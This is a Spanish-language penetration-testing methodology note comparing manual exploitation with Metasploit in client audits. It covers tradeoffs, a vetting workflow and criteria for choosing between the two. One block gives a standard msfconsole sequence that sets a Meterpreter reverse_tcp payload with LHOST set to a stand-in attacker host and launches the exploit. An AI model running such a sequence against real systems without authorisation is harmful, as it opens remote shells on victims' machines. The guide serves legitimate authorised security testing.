# 03.2 Explotación Manual vs. Metasploit

## Objetivo

Decidir con criterio cuándo usar Metasploit y cuándo explotar a mano, y documentar ambos casos de forma que el informe final sea defendible ante un cliente técnico.

## Comparativa

| | Manual | Metasploit |
|---|---|---|
| **Control** | Total — cada paso es explícito y auditable | El módulo abstrae pasos; hay que leer el código fuente si el cliente pregunta "¿qué hizo exactamente?" |
| **Velocidad** | Más lento, requiere adaptar el exploit al objetivo | Rápido si existe módulo para el CVE exacto |
| **Ruido / huella en el objetivo** | Controlable, se ajusta payload a payload | Los módulos y payloads de Meterpreter son firmas muy conocidas por EDR/AV |
| **Valor de aprendizaje y defensa** | Alto — entender el exploit es lo que permite luego escribir una regla de detección contra él | Bajo si se usa como caja negra |
| **Reproducibilidad en el informe** | Requiere documentar manualmente cada paso | `msfconsole` deja log de sesión fácil de adjuntar |

## Flujo recomendado

1. **Buscar el CVE/vulnerabilidad identificada en la fase de enumeración** contra bases públicas:
   ```bash
   searchsploit nombre-del-servicio version
   searchsploit -m <ruta-del-exploit>   # copia el exploit localmente para revisarlo antes de lanzarlo
   ```
2. **Leer el exploit antes de ejecutarlo.** Nunca lanzar código descargado de internet contra un sistema de un cliente sin haberlo revisado línea a línea — es tanto una medida de seguridad operativa (evitar un exploit que en realidad es un backdoor) como un requisito de debida diligencia profesional.
3. **Si existe módulo de Metasploit equivalente**, usarlo para confirmar explotabilidad rápido, pero documentar también la ruta manual si el tiempo lo permite — el valor diferencial de un informe "junior++" está en explicar el *por qué* funciona el exploit, no solo en el `[+] Exploit completed`.

## Uso de Metasploit — flujo estándar

```bash
msfconsole -q

search type:exploit cve:2024-XXXXX
use exploit/multi/http/nombre_del_modulo
show options
set RHOSTS $TARGET
set LHOST ATACANTE
set payload linux/x64/meterpreter/reverse_tcp
exploit

# Dentro de Meterpreter:
sysinfo
getuid
background   # para volver a msfconsole sin cerrar la sesión
```

## Explotación manual — flujo estándar

```bash
# 1. Adaptar un PoC público al offset/versión exacta del objetivo
# 2. Compilar/preparar el exploit localmente
# 3. Probar primero contra un entorno de laboratorio equivalente si es posible
# 4. Lanzar contra el objetivo con el listener ya preparado (ver 01-Gestión-de-Shells-y-Payloads.md)
```

## Criterio de elección en una auditoría real

| Situación | Elección |
|---|---|
| Cliente pide "probar explotabilidad, no comprometer producción" | Metasploit en modo `check` cuando el módulo lo soporta, sin lanzar el payload completo |
| Vulnerabilidad crítica (RCE no autenticado) en sistema de producción frágil | Explotación manual controlada, con payload mínimo (comando único, no shell interactiva) para minimizar impacto |
| Vulnerabilidad conocida, módulo maduro y estable de Metasploit disponible | Metasploit, documentando el módulo exacto y versión usados |
| CVE reciente sin módulo público | Manual, adaptando el PoC disponible |

## Siguiente paso

Con acceso confirmado, documentar el vector exacto en una plantilla PoC (`06-Plantillas-y-Reportes/01-Plantilla-PoC-Vulnerabilidad.md`) antes de continuar a post-explotación.
